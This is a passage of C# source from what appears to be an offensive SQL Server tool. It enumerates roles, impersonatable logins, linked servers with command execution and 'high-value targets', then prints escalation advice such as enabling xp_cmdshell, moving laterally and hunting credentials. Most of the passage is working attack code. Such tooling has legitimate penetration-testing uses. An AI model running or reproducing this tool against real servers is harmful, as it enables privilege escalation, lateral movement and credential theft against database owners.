						AND p.name NOT IN ('dbo', 'guest', 'INFORMATION_SCHEMA', 'sys')
						AND p.name NOT LIKE '##%'
						ORDER BY p.name;";
					
					using (var reader = new SqlCommand(usersSql, con).ExecuteReader())
					{
						while (reader.Read())
						{
							var user = new
							{
								Database = dbName,
								Name = reader[0].ToString(),
								Type = reader[1].ToString(),
								CreateDate = Convert.ToDateTime(reader[2]),
								ModifyDate = Convert.ToDateTime(reader[3]),
								LoginName = reader[4].ToString(),
								DatabaseRoles = new List<string>()
							};
							allDatabaseUsers.Add(user);
							Console.WriteLine($"   - {user.Name} ({user.Type}) -> Login: {user.LoginName}");
						}
					}
					
					// Get database roles for each user
					foreach (var user in allDatabaseUsers.Where(u => ((dynamic)u).Database == dbName))
					{
						string userName = ((dynamic)user).Name;
						string dbRolesSql = $@"
							SELECT r.name
							FROM [{dbName}].sys.database_role_members rm
							INNER JOIN [{dbName}].sys.database_principals r ON rm.role_principal_id = r.principal_id
							INNER JOIN [{dbName}].sys.database_principals p ON rm.member_principal_id = p.principal_id
							WHERE p.name = '{userName.Replace("'", "''")}'";
						
						var dbRoles = new List<string>();
						try
						{
							using (var reader = new SqlCommand(dbRolesSql, con).ExecuteReader())
							{
								while (reader.Read())
								{
									dbRoles.Add(reader[0].ToString());
								}
							}
							((dynamic)user).DatabaseRoles = dbRoles;
						}
						catch (Exception ex)
						{
							logger?.LogAction("USER_DB_ROLES_ERROR", $"Error getting DB roles for {userName} in {dbName}", ex.Message, "ERROR");
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"   [!] Error analyzing users in {dbName}: {ex.Message}");
					logger?.LogAction("DATABASE_USERS_ERROR", $"Error analyzing users in {dbName}", ex.Message, "ERROR");
				}
			}
			
			// Export comprehensive user and permission data
			var userPermissionData = new
			{
				Timestamp = DateTime.Now,
				ServerLogins = serverLogins,
				DatabaseUsers = allDatabaseUsers,
				Summary = new
				{
					TotalServerLogins = serverLogins.Count,
					TotalDatabaseUsers = allDatabaseUsers.Count,
					DatabasesAnalyzed = databases.Count
				}
			};
			
			logger?.ExportStructuredData("users_and_permissions.json", userPermissionData, "Export comprehensive user and permission data");
			logger?.LogAction("USER_PERMISSIONS_COMPLETE", "User and permission enumeration", $"Analyzed {serverLogins.Count} server logins and {allDatabaseUsers.Count} database users across {databases.Count} databases");
			
			Console.WriteLine($"\n[+] User and permission analysis complete:");
			Console.WriteLine($"    - {serverLogins.Count} server logins analyzed");
			Console.WriteLine($"    - {allDatabaseUsers.Count} database users analyzed");
			Console.WriteLine($"    - {databases.Count} databases analyzed");
			Console.WriteLine($"    - Exported to: users_and_permissions.json");
		}
		catch (Exception ex)
		{
			Console.WriteLine($"[!] Error during user and permission enumeration: {ex.Message}");
			logger?.LogAction("USER_PERMISSIONS_ERROR", "User and permission enumeration", ex.Message, "ERROR");
		}
	}

			private static void Enumerate(SqlConnection con)
	{
		// Collect basic server information
		string systemUser = ExecuteScalar("SELECT SYSTEM_USER;", con);
		string userName = ExecuteScalar("SELECT USER_NAME();", con);
		string serverName = ExecuteScalar("SELECT @@SERVERNAME;", con);
		string version = ExecuteScalar("SELECT @@VERSION;", con)?.Split('\n')[0];
		
		Console.WriteLine($"[*] SYSTEM_USER : {systemUser}");
		Console.WriteLine($"[*] USER_NAME   : {userName}");
		Console.WriteLine($"[*] SERVER      : {serverName}");
		Console.WriteLine($"[*] VERSION     : {version}");
		
		// Log basic server info
		var serverInfo = new
		{
			SystemUser = systemUser,
			UserName = userName,
			ServerName = serverName,
			Version = version
		};
		string serverInfoJson = JsonSerializer.Serialize(serverInfo, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("SERVER_INFO", "Basic server enumeration", serverInfoJson);
		
		// Export server info to file
		logger?.ExportStructuredData("server_info.json", serverInfo, "Export server information");
		
		Console.WriteLine("\n[*] Server Roles:");
		bool isSysadmin = false;
		var serverRoles = new List<(string role, bool hasRole)>();
		foreach (var role in new[] { "public", "sysadmin", "securityadmin", "serveradmin", "setupadmin", "processadmin", "diskadmin", "dbcreator", "bulkadmin" })
		{
			string res = ExecuteScalar($"SELECT IS_SRVROLEMEMBER('{role}');", con);
			bool hasRole = res == "1";
			if (role == "sysadmin" && hasRole) isSysadmin = true;
			Console.WriteLine($"    - {role} : {(hasRole ? "YES" : "no")}");
			serverRoles.Add((role, hasRole));
		}
		
		// Log server roles
		string serverRolesJson = JsonSerializer.Serialize(serverRoles, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("SERVER_ROLES", "Server role enumeration", serverRolesJson);

		Console.WriteLine("\n[*] Database Roles:");
		var databaseRoles = new List<(string role, bool hasRole)>();
		foreach (var role in new[] { "db_owner", "db_datareader", "db_datawriter", "db_ddladmin", "db_securityadmin" })
		{
			string res = ExecuteScalar($"SELECT IS_ROLEMEMBER('{role}');", con);
			bool hasRole = res == "1";
			Console.WriteLine($"    - {role} : {(hasRole ? "YES" : "no")}");
			databaseRoles.Add((role, hasRole));
		}
		
		// Log database roles
		string databaseRolesJson = JsonSerializer.Serialize(databaseRoles, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("DATABASE_ROLES", "Database role enumeration", databaseRolesJson);

					// Collect impersonatable logins with their group memberships
		var impersonatableLogins = new List<(string name, List<string> roles)>();
		Console.WriteLine("\n[*] Impersonatable Logins:");
		using (var reader = new SqlCommand(@"
			SELECT DISTINCT b.name 
			FROM sys.server_permissions a 
			INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
			WHERE a.permission_name = 'IMPERSONATE'
			UNION
			SELECT name FROM sys.server_principals 
			WHERE type IN ('S','U') AND name NOT LIKE '##%' AND name NOT IN ('sa','guest')
			AND HAS_PERMS_BY_NAME(name, 'LOGIN', 'IMPERSONATE') = 1;", con).ExecuteReader())
		{
			bool hasResults = false;
			while (reader.Read()) 
			{
				string loginName = reader[0].ToString() ?? "";
				Console.WriteLine("   > " + loginName);
				impersonatableLogins.Add((loginName, new List<string>()));
				hasResults = true;
			}
			if (!hasResults) Console.WriteLine("   (none found)");
		}

		// Get role memberships and permissions for impersonatable logins
		foreach (var login in impersonatableLogins)
		{
			using (var reader = new SqlCommand($@"
				SELECT r.name 
				FROM sys.server_role_members rm
				INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
				INNER JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id
				WHERE p.name = '{login.name.Replace("'", "''")}'", con).ExecuteReader())
			{
				while (reader.Read())
				{
					login.roles.Add(reader[0].ToString() ?? "");
				}
			}
		}

		// Create detailed login data for export
		var loginDetails = new List<object>();

		// Show detailed permissions for each impersonatable login
		if (impersonatableLogins.Any())
		{
			Console.WriteLine("\n[*] Impersonatable Login Details:");
			foreach (var login in impersonatableLogins)
			{
				Console.WriteLine($"\n   [*] {login.name}:");
				
				// Show roles
				if (login.roles.Any())
				{
					Console.WriteLine($"      Roles: {string.Join(", ", login.roles)}");
				}
				else
				{
					Console.WriteLine("      Roles: (none)");
				}

				// Test permissions using helper function
				var permissions = TestLoginPermissions(login.name, con);
				if (permissions.Any())
				{
					Console.WriteLine("      Permissions:");
									foreach (var perm in permissions)
				{
					Console.WriteLine($"        - {perm}");
				}
				}
				else
				{
					Console.WriteLine("      Permissions: Limited/Standard user");
				}
				
				// Add to export data
				loginDetails.Add(new
				{
					LoginName = login.name,
					Roles = login.roles,
					Permissions = permissions,
					IsSysAdmin = permissions.Any(p => p.Contains("SYSADMIN")),
					IsHighValue = permissions.Any(p => p.Contains("CONTROL SERVER") || p.Contains("SYSADMIN") || p.Contains("IMPERSONATE ANY"))
				});
			}
		}
		
		// Log and export impersonatable logins
		string loginsJson = JsonSerializer.Serialize(loginDetails, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("IMPERSONATABLE_LOGINS", "Impersonatable login enumeration", loginsJson);
		
		// Export to separate file
		if (loginDetails.Any())
		{
			logger?.ExportStructuredData("impersonatable_logins.json", loginDetails, "Export impersonatable logins");
		}

					Console.WriteLine("\n[*] Impersonatable Database Users:");
		var databaseUsers = new List<string>();
		using (var reader = new SqlCommand(@"
			SELECT DISTINCT p.name
			FROM sys.database_permissions dp
			INNER JOIN sys.database_principals p ON dp.grantor_principal_id = p.principal_id
			WHERE dp.permission_name = 'IMPERSONATE'
			UNION
			SELECT name FROM sys.database_principals 
			WHERE type IN ('S','U') AND name NOT LIKE '##%' AND name NOT IN ('dbo','guest','INFORMATION_SCHEMA','sys')
			AND HAS_PERMS_BY_NAME(name, 'USER', 'IMPERSONATE') = 1;", con).ExecuteReader())
		{
			bool hasResults = false;
			while (reader.Read()) 
			{
				string dbUserName = reader[0].ToString();
				Console.WriteLine("   > " + dbUserName);
				databaseUsers.Add(dbUserName);
				hasResults = true;
			}
			if (!hasResults) Console.WriteLine("   (none found)");
		}
		
		// Log database users
		logger?.LogAction("DATABASE_USERS", "Impersonatable database users", JsonSerializer.Serialize(databaseUsers, new JsonSerializerOptions { WriteIndented = true }));

		Console.WriteLine("\n[*] High-Value Targets:");
		var highValueTargets = new List<object>();
		using (var reader = new SqlCommand(@"
			SELECT name, type_desc FROM sys.server_principals 
			WHERE name LIKE '%svc%' OR name LIKE '%service%' OR name LIKE '%admin%' 
			OR name LIKE '%sql%' OR name LIKE '%backup%'
			AND type IN ('S','U') AND name NOT LIKE '##%';", con).ExecuteReader())
		{
			bool hasResults = false;
			while (reader.Read()) 
			{
				string name = reader[0].ToString();
				string type = reader[1].ToString();
				Console.WriteLine($"   > {name} ({type})");
				highValueTargets.Add(new { Name = name, Type = type });
				hasResults = true;
			}
			if (!hasResults) Console.WriteLine("   (none found)");
		}
		
		// Log high-value targets
		logger?.LogAction("HIGH_VALUE_TARGETS", "High-value target enumeration", JsonSerializer.Serialize(highValueTargets, new JsonSerializerOptions { WriteIndented = true }));

					// Integrated linked server enumeration
		Console.WriteLine("\n[*] Linked Servers (with remote access):");
		var linkedServers = new List<string>();
		var executableLinkedServers = new List<string>();
		var networkTopology = new List<object>();
		
		using (var reader = new SqlCommand("EXEC sp_linkedservers;", con).ExecuteReader())
		{
			while (reader.Read()) 
			{
				linkedServers.Add(reader[0].ToString());
			}
		}

		if (linkedServers.Count == 0)
		{
			Console.WriteLine("   (none found)");
		}
		else
		{
			foreach (string srv in linkedServers)
			{
				Console.WriteLine($"   > {srv}");

				// Test connectivity using helper function
				string login = TestLinkedServerConnectivity(srv, con);
				bool hasAccess = !string.IsNullOrEmpty(login);
				bool canExecute = false;
				
				if (hasAccess)
				{
					Console.WriteLine($"     └─ Remote context: {login}");
					
					// Test command execution using helper function
					canExecute = TestLinkedServerExecution(srv, con);
					
					if (canExecute)
					{
											Console.WriteLine("     └─ Command execution: [AVAILABLE]");
					executableLinkedServers.Add(srv);
				}
				else
				{
					Console.WriteLine("     └─ Command execution: [BLOCKED] (insufficient privileges)");
					}
				}
				else
				{
					Console.WriteLine("     └─ No access");
				}
				
				// Add to network topology
				networkTopology.Add(new
				{
					ServerName = srv,
					HasAccess = hasAccess,
					RemoteContext = login ?? "No access",
					CanExecuteCommands = canExecute,
					AccessLevel = canExecute ? "Full (Command Execution)" : hasAccess ? "Limited (Query Only)" : "None"
				});
			}
		}
		
		// Log and export network topology
		string topologyJson = JsonSerializer.Serialize(networkTopology, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("NETWORK_TOPOLOGY", "Linked server enumeration", topologyJson);
		
		// Export network topology to separate file
		if (networkTopology.Any())
		{
			logger?.ExportStructuredData("network_topology.json", networkTopology, "Export network topology");
		}

					// Escalation path analysis
		Console.WriteLine("\n" + new string('=', 50));
		Console.WriteLine("ESCALATION PATH ANALYSIS");
		Console.WriteLine(new string('=', 50));

		var escalationPaths = new List<object>();
		var recommendations = new List<string>();

		if (isSysadmin)
		{
			Console.WriteLine("[CRITICAL] ALREADY PWNED: You are sysadmin!");
			Console.WriteLine("   - Can impersonate any login");
			Console.WriteLine("   - Can enable xp_cmdshell");
			Console.WriteLine("   - Full server control");
			
			escalationPaths.Add(new
			{
				Type = "ALREADY_COMPROMISED",
				Severity = "CRITICAL",
				Description = "Current user has sysadmin privileges",
				Actions = new[] { "Can impersonate any login", "Can enable xp_cmdshell", "Full server control" }
			});
			
			recommendations.AddRange(new[]
			{
				"Enable xp_cmdshell for command execution",
				"Enumerate linked servers for lateral movement",
				"Search for sensitive data in databases"
			});
		}
		else
		{
			bool foundEscalation = false;

			// Check for high-value impersonatable logins based on actual permissions
			foreach (var login in impersonatableLogins)
			{
				bool isEscalation = AnalyzeLoginEscalation(login.name, login.roles, con);
				if (isEscalation)
				{
					foundEscalation = true;
					var loginDetail = loginDetails.FirstOrDefault(l => ((dynamic)l).LoginName == login.name);
					if (loginDetail != null)
					{
						escalationPaths.Add(new
						{
							Type = "LOGIN_IMPERSONATION",
							Severity = ((dynamic)loginDetail).IsSysAdmin ? "CRITICAL" : "HIGH",
							Target = login.name,
							Roles = login.roles,
							Permissions = ((dynamic)loginDetail).Permissions,
							Command = $"EXECUTE AS LOGIN = '{login.name}'"
						});
					}
				}
			}

			// Check linked servers for lateral movement
			if (executableLinkedServers.Any())
			{
				Console.WriteLine($"[LATERAL] LATERAL MOVEMENT: {executableLinkedServers.Count} linked server(s) available");
				Console.WriteLine("   - May have different privilege contexts");
				Console.WriteLine("   - Check for sysadmin access on remote servers");
				foundEscalation = true;
				
				escalationPaths.Add(new
				{
					Type = "LATERAL_MOVEMENT",
					Severity = "MEDIUM",
					Description = $"{executableLinkedServers.Count} linked servers with command execution",
					Targets = executableLinkedServers,
					Actions = new[] { "May have different privilege contexts", "Check for sysadmin access on remote servers" }
				});
				
				recommendations.AddRange(executableLinkedServers.Select(srv => $"Test privileges on linked server: {srv}"));
			}

			if (!foundEscalation)
			{
				Console.WriteLine("[WARNING] LIMITED PRIVILEGES: No obvious escalation paths found");
				Console.WriteLine("   - Try database-specific attacks");
				Console.WriteLine("   - Look for custom stored procedures");
				Console.WriteLine("   - Check for SQL injection in applications");
				
				escalationPaths.Add(new
				{
					Type = "LIMITED_PRIVILEGES",
					Severity = "LOW",
					Description = "No obvious escalation paths found",
					Recommendations = new[] { "Try database-specific attacks", "Look for custom stored procedures", "Check for SQL injection in applications" }
				});
				
				recommendations.AddRange(new[]
				{
					"Enumerate all databases for sensitive data",
					"Search for custom stored procedures",
					"Look for SQL injection opportunities"
				});
			}
		}

		Console.WriteLine(new string('=', 50));
		
		// Create comprehensive enumeration summary
		var enumerationSummary = new
		{
			Timestamp = DateTime.Now,
			ServerInfo = new { SystemUser = systemUser, UserName = userName, ServerName = serverName, Version = version },
			ServerRoles = serverRoles.Where(r => r.hasRole).Select(r => r.role).ToList(),
			DatabaseRoles = databaseRoles.Where(r => r.hasRole).Select(r => r.role).ToList(),
			IsSysAdmin = isSysadmin,
			ImpersonatableLogins = loginDetails,
			DatabaseUsers = databaseUsers,
			HighValueTargets = highValueTargets,
			NetworkTopology = networkTopology,
			EscalationPaths = escalationPaths,
			Recommendations = recommendations,
			Summary = new
			{
				TotalLinkedServers = linkedServers.Count,
				ExecutableLinkedServers = executableLinkedServers.Count,
				ImpersonatableLoginsCount = impersonatableLogins.Count,
				HighValueTargetsCount = highValueTargets.Count,
				EscalationPathsFound = escalationPaths.Count
			}
		};
		
		// Log comprehensive summary
		string summaryJson = JsonSerializer.Serialize(enumerationSummary, new JsonSerializerOptions { WriteIndented = true });
		logger?.LogAction("ENUMERATION_SUMMARY", "Complete enumeration summary", summaryJson);
		
		// Export comprehensive summary
		logger?.ExportStructuredData("enumeration_summary.json", enumerationSummary, "Export enumeration summary");
		
		// Comprehensive Database Structure Enumeration
		Console.WriteLine("\n" + new string('=', 50));
		Console.WriteLine("COMPREHENSIVE DATABASE ANALYSIS");
		Console.WriteLine(new string('=', 50));
		
		EnumerateComprehensiveDatabaseStructure(con);
		
		// Enumerate all users and permissions
		EnumerateAllUsersAndPermissions(con);
		
		// Hunt for credentials in interesting tables
		Console.WriteLine("\n" + new string('=', 50));
		Console.WriteLine("CREDENTIAL HUNTING");
		Console.WriteLine(new string('=', 50));
		
		HuntCredentialsInInterestingTables(con);
		}


	}
}